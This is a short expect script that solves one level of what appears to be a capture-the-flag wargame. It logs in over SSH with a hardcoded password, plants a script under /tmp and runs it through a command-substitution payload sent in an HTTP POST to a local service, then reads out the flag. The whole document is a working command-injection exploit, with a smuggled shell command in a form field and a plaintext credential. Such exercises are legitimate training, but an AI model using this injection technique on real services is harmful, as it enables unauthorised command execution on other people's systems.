#!/usr/bin/expect -f
set ip 192.168.1.103
spawn ssh -o "StrictHostKeyChecking no" level12@$ip -p 4242 "mkdir -p /tmp/FLAG ; cd /tmp/FLAG ; rm -rf ./* ; chmod 777 . ; echo \"\\\`getflag > /tmp/FLAG/token\\\`\" > SCRIPT ; chmod 777 SCRIPT ; curl -s 127.0.0.1:4646 -d \"x=\\\$\(/*/FLAG/SCRIPT\)\" ; cat /tmp/FLAG/token"
expect "sword:"
send "fa6v5ateaw21peobuub8ipe6s\r"
interact
